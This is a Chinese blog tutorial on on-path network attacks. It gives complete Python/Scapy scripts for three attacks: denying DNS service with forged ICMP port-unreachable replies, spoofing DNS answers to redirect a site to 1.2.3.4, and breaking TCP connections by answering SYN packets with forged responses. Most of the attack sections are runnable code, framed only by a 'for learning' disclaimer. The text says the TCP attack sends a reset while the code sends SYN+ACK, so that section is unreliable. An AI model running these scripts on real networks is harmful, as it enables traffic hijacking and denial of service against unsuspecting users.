{"title": "网络安全 - 旁路监听攻击技术 - 互相帮助，相互学习 ", "index": "windows,python", "content": "部分来自网络，适用于学习，维护网络安全，做合法公民\n一、UDP\n和TCP不同，UDP没有面向连接的机制，其是一种不可靠的协议，没有确认机制。也就是说只要其端口开放，有数据需要交互时直接进行数据交互，也不需要TCP的三次握手。这样的话，基于UDP的攻击比基于TCP的攻击需要分析的条件相对少了一些。\n下面是Python实现过程：\n1、配置环境\n本人使用的是Win7 64位系统，Python2.7.9，Scapy2.3.3（Python版本必须>=2.7.9，因为Scapy其它版本缺少模块）。\n安装Python后，下载 setuptools-36.2.0 ，解压到任意目录下，运行：\n\n运行成功后，会生成Script目录，里面就是下载Python模块的工具了：\n\n接下来我们安装Scapy2.3.3：\n\n以上我们就将环境配置好了。\n2、安装抓包工具 Wireshark\n\nWireshark使用起来很简单，这里不做过多介绍。抓包工具有很多，下面介绍几款流行抓包工具：Wireshark、Fiddler（可抓取网站或手机数据包，可支持Https）、Burpsuite、tcpdump（Linux自带工具）、airodump-ng（Wifi渗透，可显示路由器的BSSID ESSID，以及所有连接的客户端。但需要一款可监听注入的网卡）等等。\n运行Wireshark，点击监听的网络：\n\n接下来我们 ping www.baidu.com 会抓到什么包？\n\n\n\n上图依次为DNS域名查询请求与响应，成功返回ip。以上就是一次DNS域名解析的过程。\n查询网卡详细信息：\n\n3、实施攻击\n3.1、UDP DOS\n因为UDP是无连接的，同一个连接中的报文与前面或后面的报文都没有直接关系。因此对其DOS攻击不像TCP那样只需要发送一个reset包就可以干掉一个TCP连接那样简单，针对UDP的DOS需要将每个报文都DOS掉，不然应用层的重传机制还是会重传相应数据以保持会话与交互的数据完整。因此针对UDP的DOS攻击一般情况下都是针对UDP的轻量化应用进行攻击，如DNS这种小量交互的报文，而不是P2P这种大量报文交互的应用。\n因此对其进行DOS非常简单，只需要监听网络中的DNS流量，有DNS查询时，直接返回一个ICMP Port unreachable报文即可，表示端口没有开放。若为TCP的应用，其端口没有开放时，一般回应一个reset报文。并且有一点一定要保证，就是ICMP port unreachable报文一定要比正常的DNS 响应报文早到客户端，这样才可以达到DOS的效果。\n部分代码做了注释：\n#!/usr/bin/python\n# -*- coding: utf-8 -*-\n\nimport random\nfrom scapy.all import *\nfrom scapy.arch.windows import compatibility\n\n# 防止scapy2.3.3版本中出现log_runtime错误\ncompatibility.log_runtime = log_runtime\ncompatibility.MTU = MTU\ncompatibility.PcapTimeoutElapsed = PcapTimeoutElapsed\ncompatibility.ETH_P_ALL = ETH_P_ALL\ncompatibility.plist = plist\ncompatibility.sniff(1)\n\nconf.iface = 'Intel(R) Ethernet Connection I217-LM' # 绑定网卡，替换成之前所保存的网卡信息，linux需在sniff()中指定网卡\n\n# DNS响应的地址，随机ip字段的id和ttl\nipid = random.randint(1,65535)\nipttl = random.randint(45,80)\n\ndef buying(mots):\n\n    resp = Ether()/IP()/ICMP()/IP()/UDP()\n\n    #构造ICMP报文\n    resp[ICMP].type = 3\n    resp[ICMP].code = 3\n    resp[ICMP][IP].src = mots[IP].src\n    resp[ICMP][IP].dst = mots[IP].dst\n    resp[ICMP][IP].ttl = ipttl\n    resp[ICMP][IP].id = ipid\n    resp[ICMP][UDP].sport = mots[UDP].sport\n    resp[ICMP][UDP].dport = mots[UDP].dport\n\n    #构造IP包头\n    resp[IP].src = mots[IP].dst\n    resp[IP].dst = mots[IP].src\n    resp[IP].ttl = ipttl\n    resp[IP].id  = ipid\n\n    #构造以太网包头\n    resp[Ether].src = mots[Ether].dst\n    resp[Ether].dst = mots[Ether].src\n\n    #发送构造的ICMP响应包\n    sendp(resp, count = 100)\n\nif __name__ == '__main__':\n    print 'start sniff'\n    sniff(prn=buying, filter=\"udp dst port 53\") # 嗅探，过滤upd目标端口53\n命令行运行Python程序，然后再次 ping www.baidu.com，出现以下情况：\n\n由于DNS使用UDP，而UDP是一种不可靠的协议，其存在丢包的可能，因此DNS为了保证应用的可靠性，一般的DNS查询都是发送多个，当前面一个查询失败时，会继续发送DNS查询报文。如果第一个DNS查询被DOS了，但是第二个DNS时却被正常响应了。所以导致DNS结果还是正常的。\n\n\n3.2、UDP 欺骗\n很简单，在监听到客户端发送请求时，发送一个伪造的响应，并且比正常的响应早到，这样即可达到欺骗的效果。实际攻击还是攻击轻量化的应用，流量较大的攻击效果不一定明显，且成本很大。还是以DNS为测试目标吧。DNS污染在运营商里做的比较多，原理很简单:利益。并且其实现起来具有天然优势，可以在关键链路和节点进行分光监听并发送伪造的数据包。\n#!/usr/bin/python\n# -*- coding: utf-8 -*-\n\nimport random\nfrom scapy.all import *\nfrom scapy.arch.windows import compatibility\n\n# 防止scapy2.3.3版本中出现log_runtime错误\ncompatibility.log_runtime = log_runtime\ncompatibility.MTU = MTU\ncompatibility.PcapTimeoutElapsed = PcapTimeoutElapsed\ncompatibility.ETH_P_ALL = ETH_P_ALL\ncompatibility.plist = plist\ncompatibility.sniff(1)\n\nconf.iface = 'Intel(R) Ethernet Connection I217-LM' # 绑定网卡，linux需在sniff()中指定网卡\n\n# DNS响应的地址，随机ip字段的id和ttl\nrdata = \"1.2.3.4\"\nipid = random.randint(1,65535)\nipttl = random.randint(45,80)\n\ndef buying(mots):\n\n    resp = Ether()/IP()/UDP()/DNS()\n\n    #构造DNS相关字段\n    resp[DNS].qr = 1\n    resp[DNS].rd = 1\n    resp[DNS].qdcount = 1\n    resp[DNS].ancount = 1\n    resp[DNS].id = mots[DNS].id\n    resp[DNS].qd = mots[DNS].qd\n    resp[DNS].an = DNSRR(type='A',rclass='IN',ttl=1800,rdata=rdata)\n    resp[DNS].an.rrname = mots[DNS].qd.qname\n\n    #构造UDP相关字段\n    resp[UDP].dport = mots[UDP].sport\n    resp[UDP].sport = mots[UDP].dport\n\n    #构造IP包头\n    resp[IP].src = mots[IP].dst\n    resp[IP].dst = mots[IP].src\n    resp[IP].ttl = ipttl\n    resp[IP].id  = ipid\n\n    #构造以太网包头\n    resp[Ether].src = mots[Ether].dst\n    resp[Ether].dst = mots[Ether].src\n\n    #发送构造的DNS响应包\n    sendp(resp)\n    print(\"DNS响应为:\",mots[DNS].qd.qname,'->',rdata)\n\nif __name__ == '__main__':\n    print 'start sniff'\n    sniff(prn=buying,filter=\"udp dst port 53\")\n命令行运行Python程序，然后再次 ping www.baidu.com，出现以下情况：\n\n\n\n以上就成功进行了UDP欺骗，将百度重定向到1.2.3.4上。\n二、TCP\n比如探测某一端口是否开放时，一般发送SYN，若其端口开放，对方回应SYN+ACK；若端口不开放，则回应reset。所以针对TCP的应用，我们进行DOS时，可以监听其SYN包，一旦有客户端发送SYN，直接给其回应reset，并且保证伪造的reset比正常的响应包早到，即可达到DOS的效果。\n1、配置环境\n与UDP配置相同\n2、实施攻击\n2.1、TCP DOS\n#!/usr/bin/python\n# -*- coding: utf-8 -*-\n\nimport random\nfrom scapy.all import *\nfrom scapy.arch.windows import compatibility\n\n# 防止scapy2.3.3版本中出现log_runtime错误\ncompatibility.log_runtime = log_runtime\ncompatibility.MTU = MTU\ncompatibility.PcapTimeoutElapsed = PcapTimeoutElapsed\ncompatibility.ETH_P_ALL = ETH_P_ALL\ncompatibility.plist = plist\ncompatibility.sniff(1)\n\nconf.iface = 'Intel(R) Ethernet Connection I217-LM' # 绑定网卡，linux需在sniff()中指定网卡\n\n#随机ip字段的id和ttl\nipid = random.randint(1,65535)\nipttl = random.randint(45,80)\ntcpseq = random.randint(1,4294967295)\n\ndef buying(tcpmots):\n\n    resp = Ether()/IP()/TCP()\n\n    #构造TCP相关字段\n    resp[TCP].dport = tcpmots[TCP].sport\n    resp[TCP].sport = tcpmots[TCP].dport\n    resp[TCP].ack = 0 # ack大小可以任意指定\n    resp[TCP].flags = 'SA'\n    resp[TCP].window = 0\n\n    # 构造IP包头\n    resp[IP].src = tcpmots[IP].dst\n    resp[IP].dst = tcpmots[IP].src\n    resp[IP].ttl = ipttl\n    resp[IP].id  = ipid\n\n    #构造以太网包头\n    resp[Ether].src = tcpmots[Ether].dst\n    resp[Ether].dst = tcpmots[Ether].src\n\n    #发送构造的TCP DOS 包\n    sendp(resp,count=1)\n    print('TCP DOS 攻击',resp[IP].dst,'成功')\n\nif __name__ == '__main__':\n    print 'start sniff'\n    sniff(prn=buying,filter='tcp[tcpflags]&(tcp-syn)!=0 and tcp[tcpflags]&(tcp-ack)==0')\n运行以上代码：\n\n大家实验可能失败的因素有很多，比如对DNS进行了加密、采用DNS延迟解析、网络不稳定都会对攻击产生一定影响，不是每次攻击都会成功，这点希望大家能注意到。\n\n                ", "mainLikeNum": ["1 "], "mainBookmarkNum": "24"}